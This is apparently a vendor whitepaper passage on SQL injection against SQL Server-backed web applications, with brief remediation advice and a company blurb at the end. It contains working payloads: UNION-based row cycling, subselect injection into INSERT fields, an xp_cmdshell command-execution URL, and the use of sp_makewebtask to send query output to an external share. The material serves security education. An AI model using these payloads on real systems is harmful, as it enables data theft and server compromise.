### Retrieving Table and Column Information in SQL Server

To obtain a list of all user-defined tables in a SQL Server database, you can use the following query. Note that this query should be adapted to fit your specific circumstances:

```sql
SELECT name 
FROM sysobjects 
WHERE xtype = 'U';
```

This query will return the names of all user-defined tables (where `xtype = 'U'` specifies user-defined tables). Once you have identified an interesting table, such as `Orders`, you can retrieve the names of its columns using the following query:

```sql
SELECT name 
FROM syscolumns 
WHERE id = (SELECT id FROM sysobjects WHERE name = 'Orders');
```

### Single Record Cycling

If possible, use an application designed to return multiple results, such as a search tool, which is ideal for returning data from many rows at once. Some applications are designed to handle only one recordset at a time, ignoring the rest. If you are limited to a single product display application, you can still retrieve the desired information by manipulating the injection query.

You can achieve this by adding qualifiers to the `WHERE` clause to exclude certain rows. For example, if you start with the following injection string:

```sql
' UNION ALL SELECT name, FieldTwo, FieldThree FROM TableOne WHERE ''='
```

And you receive the first values in `FieldOne`, `FieldTwo`, and `FieldThree` as "Alpha", "Beta", and "Delta" respectively, your next injection string would be:

```sql
' UNION ALL SELECT FieldOne, FieldTwo, FieldThree FROM TableOne 
WHERE FieldOne NOT IN ('Alpha') AND FieldTwo NOT IN ('Beta') 
AND FieldThree NOT IN ('Delta') AND ''='
```

The `NOT IN` clause ensures that the known values are not returned again, allowing the next row to be selected. If the next values are "AlphaAlpha", "BetaBeta", and "DeltaDelta", your subsequent injection string would be:

```sql
' UNION ALL SELECT FieldOne, FieldTwo, FieldThree FROM TableOne 
WHERE FieldOne NOT IN ('Alpha', 'AlphaAlpha') 
AND FieldTwo NOT IN ('Beta', 'BetaBeta') 
AND FieldThree NOT IN ('Delta', 'DeltaDelta') AND ''='
```

This process continues until all rows have been retrieved. While this method can result in large and cumbersome queries, it is the most effective approach for cycling through a table with many rows.

### INSERT Statements

#### Insert Basics

The `INSERT` keyword is used to add new records to a database. Common uses include user registrations, bulletin boards, and adding items to shopping carts. Testing for `INSERT` vulnerabilities is similar to testing for `WHERE` vulnerabilities. However, `INSERT` attempts may be more noticeable due to the potential for creating rows filled with single quotes and SQL keywords.

To exploit an `INSERT` vulnerability, you must be able to view the information you have submitted. This could be on a preferences page, in a greeting message, or even in spam emails.

#### Injecting Subselects

An `INSERT` query typically looks like this:

```sql
INSERT INTO TableName VALUES ('Value One', 'Value Two', 'Value Three')
```

To manipulate the `VALUES` clause, you can use subselects. For example, if the code is:

```sql
SQLString = "INSERT INTO TableName VALUES ('" & strValueOne & "', '" & strValueTwo & "', '" & strValueThree & "')"
```

And you fill out the form as follows:

- Name: `' + (SELECT TOP 1 FieldName FROM TableName) + '`
- Email: `PI:EMAIL`
- Phone: `333-333-3333`

The resulting SQL statement would be:

```sql
INSERT INTO TableName VALUES ('' + (SELECT TOP 1 FieldName FROM TableName) + '', 'PI:EMAIL', '333-333-3333')
```

When you view the user's information, you will see the first value in `FieldName` where the user's name would normally be. To cycle through all rows, use the `NOT IN` clause as described in the single record cycling section.

### SQL Server Stored Procedures

#### Stored Procedure Basics

A default installation of Microsoft SQL Server includes over a thousand stored procedures. If you can inject SQL into a web application using SQL Server, you can leverage these stored procedures to perform various tasks. The availability of these procedures depends on the permissions of the web application's database user.

Procedure injection is generally easier than regular query injection. An example of procedure injection into a quoted vulnerability might look like this:

```sql
simplequoted.asp?city=seattle';EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:
```

Here, a valid argument is provided, followed by a quote and the final argument to the stored procedure without a closing quote. This satisfies the syntax requirements of most quoted vulnerabilities.

#### xp_cmdshell

The `xp_cmdshell` stored procedure is highly powerful, allowing the execution of commands at the SQL Server's user level. However, it is often not available unless the web application's SQL Server user has `sa` privileges.

#### sp_makewebtask

Another useful stored procedure is `sp_makewebtask`, which takes an output file location and an SQL statement. It generates a webpage containing the output of the query. You can use a UNC pathname for the output location, allowing the output file to be placed on any system connected to the Internet with a publicly writable SMB share.

### Solutions

#### Data Sanitization

All client-supplied data should be cleansed of potentially malicious characters. This applies to all applications, not just those using SQL queries. Use a default-deny regular expression to filter data. For example, the following regex allows only letters and numbers:

```regex
s/[^0-9a-zA-Z]//g
```

Make your filters as specific as possible. Use numbers and letters, and convert symbols and punctuation to HTML entities, such as `&quote;` or `&gt;`.

#### Secure SQL Web Application Coding

Prepend and append a quote to all user input, even if the data is numeric. Limit the rights of the database user used by the web application, providing access only to necessary stored procedures.

### Database Server System Tables

This section lists system tables useful for SQL injection. You can find the columns in each table by searching online.

#### MS SQL Server

- `sysobjects`
- `syscolumns`

#### MS Access Server

- `MSysACEs`
- `MSysObjects`
- `MSysQueries`
- `MSysRelationships`

#### Oracle

- `SYS.USER_OBJECTS`
- `SYS.TAB`
- `SYS.USER_TABLES`
- `SYS.USER_VIEWS`
- `SYS.ALL_TABLES`
- `SYS.USER_TAB_COLUMNS`
- `SYS.USER_CONSTRAINTS`
- `SYS.USER_TRIGGERS`
- `SYS.USER_CATALOG`

### The Business Case for Application Security

A security breach, whether public or internal, is a significant concern for companies, shareholders, and customers. Proactively addressing application security and continuously engaging in the security process can better protect your company and provide a higher ROI on e-business ventures.

### About SPI Dynamics, Inc.

Founded in 2000 by a team of accomplished web security specialists, SPI Dynamics develops security products and services to detect, prevent, and communicate web application vulnerabilities and intrusions. Based in Atlanta, Georgia, SPI Dynamics serves a wide range of industries, including financial management, manufacturing, healthcare, telecommunications, and government.

For further information, please contact:

**SPI Dynamics, Inc.**
115 Perimeter Center Place, Suite 270
Atlanta, GA 30346
Toll-free: 1-866-SPI-2700
Direct: 678-781-4800
Fax: 678-781-4850
Email: [info@spidynamics.com](mailto:info@spidynamics.com)